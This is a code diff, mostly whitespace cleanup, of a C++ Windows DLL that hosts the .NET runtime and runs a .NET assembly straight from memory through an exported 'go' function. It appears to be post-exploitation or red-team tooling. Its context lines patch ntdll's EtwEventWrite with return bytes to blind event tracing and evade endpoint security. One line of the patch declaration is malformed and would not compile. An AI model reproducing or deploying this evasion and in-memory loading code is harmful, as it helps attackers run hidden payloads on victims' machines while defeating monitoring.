@@ -27,7 +27,7 @@ static const GUID xCLSID_ICLRRuntimeHost = { 0x90F1A06E, 0x7712, 0x4762, {0x86, 
 typedef HRESULT(__stdcall* CLRIdentityManagerProc)(REFIID, IUnknown**);
 
 
-#define ERROR_INIT_CLR_1 1 
+#define ERROR_INIT_CLR_1 1
 #define ERROR_INIT_CLR_2 2
 #define ERROR_INIT_CLR_3 3
 #define ERROR_INIT_CLR_4 4
@@ -57,14 +57,14 @@ typedef HRESULT(__stdcall* CLRIdentityManagerProc)(REFIID, IUnknown**);
 int loadAssembly_internal(void* ptr, int size, char* arg)
 {
 
-	
+
 	//
 	// Patch EtwEventWrite
 	//
 
 
 	void * pEventWrite = (void*)GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite");
-	
+
 	HANDLE hProc=(HANDLE)INVALID_HANDLE_VALUE;
 
 	DWORD oldprotect = 0;
@@ -80,7 +80,7 @@ int loadAssembly_internal(void* ptr, int size, char* arg)
 		char patch[] patch = "\x33\xc0\xc2\x14\x00"; // xor rax, rax; ret
 		int patchSize = 5;
 	#endif
-	
+
 	WriteProcessMemory(hProc, pEventWrite, (PVOID)patch, patchSize, 0);
 
 	VirtualProtect(pEventWrite, 1024, oldprotect, &oldprotect);
@@ -133,7 +133,7 @@ int loadAssembly_internal(void* ptr, int size, char* arg)
 	hr = m_pRuntimeInfo->GetInterface(xCLSID_ICLRRuntimeHost, IID_PPV_ARGS(&m_pClrRuntimeHost));
 	if (FAILED(hr))
 		return ERROR_INIT_CLR_4;
-	
+
 	m_pCustomHostControl = new MyHostControl();
 	m_pClrRuntimeHost->SetHostControl(m_pCustomHostControl);
 
@@ -175,7 +175,7 @@ int loadAssembly_internal(void* ptr, int size, char* arg)
 	hr = pIdentityManagerProc(IID_ICLRAssemblyIdentityManager, (IUnknown**)&pIdentityManager);
 	if (FAILED(hr))
 		return ERROR_LOAD_ASSEMLBY_1;
-	
+
 	m_pCustomHostControl->updateTargetAssembly(pIdentityManager, data);
 	LPWSTR identityBuffer = m_pCustomHostControl->getAssemblyInfo();
 
@@ -190,7 +190,7 @@ int loadAssembly_internal(void* ptr, int size, char* arg)
 	SysFreeString(assemblyName);
 	pIdentityManager->Release();
 
-	
+
 	//
 	// Exec exe
 	//
@@ -209,33 +209,33 @@ int loadAssembly_internal(void* ptr, int size, char* arg)
 	VARIANT vtPsa;
 
 	LONG i;
-	if(!argument.empty()) 
+	if(!argument.empty())
 	{
 		std::wstring wCommand(argument.begin(), argument.end());
 		WCHAR **argv;
 		int argc;
 		argv = CommandLineToArgvW(wCommand.data(), &argc);
-		
+
 		vtPsa.vt = (VT_ARRAY | VT_BSTR);
 		vtPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, argc);
 
 		// add each string parameter
-		for(i=0; i<argc; i++) 
-		{  
+		for(i=0; i<argc; i++)
+		{
 			SafeArrayPutElement(vtPsa.parray, &i, SysAllocString(argv[i]));
 		}
-	} 
-	else 
+	}
+	else
 	{
 		vtPsa.vt = (VT_ARRAY | VT_BSTR);
 		vtPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, 1);
-		
+
 		i=0;
 		SafeArrayPutElement(vtPsa.parray, &i, SysAllocString(L""));
 	}
 	i=0;
 	SafeArrayPutElement(sav, &i, &vtPsa);
-	
+
 	VARIANT retVal;
 	ZeroMemory(&retVal, sizeof(VARIANT));
 	VARIANT obj;
@@ -284,7 +284,7 @@ int loadAssembly_internal(void* ptr, int size, char* arg)
 
 
 extern "C" __declspec(dllexport) int go(void* data, int size, char* argument);
-int go(void* data, int size, char* argument) 
+int go(void* data, int size, char* argument)
 {
 	loadAssembly_internal(data, size, argument);
 
@@ -292,7 +292,7 @@ int go(void* data, int size, char* argument)
 }
 
 
-// bool readFileToBuffer(const std::string& path, std::string& outData) 
+// bool readFileToBuffer(const std::string& path, std::string& outData)
 // {
 //     std::ifstream file(path, std::ios::binary | std::ios::ate);
 //     if (!file) return false;
@@ -304,14 +304,14 @@ int go(void* data, int size, char* argument)
 //     return file.read(&outData[0], size).good();
 // }
 
-// int main(int argc, char* argv[]) 
+// int main(int argc, char* argv[])
 // {
 // 	for(int i = 0; i < argc; ++i)
 // 	{
 // 		std::cout << "Argument " << i << ": " << argv[i] << std::endl;
 // 	}
 
-//     if (argc < 3) 
+//     if (argc < 3)
 // 	{
 //         std::cerr << "Usage:\n"
 //                   << "  " << argv[0] << " <exe_file_path> <argument>\n";
@@ -325,7 +325,7 @@ int go(void* data, int size, char* argument)
 
 
 // 	std::cout << "[*] Input is a file path.\n";
-// 	if (!readFileToBuffer(source, data)) 
+// 	if (!readFileToBuffer(source, data))
 // 	{
 // 		std::cerr << "[-] Failed to read file: " << source << "\n";
 // 		return 1;
@@ -339,7 +339,7 @@ int go(void* data, int size, char* argument)
 
 
 
-BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved ) 
+BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved )
 {
 	switch ( fdwReason ) {
 			case DLL_PROCESS_ATTACH:
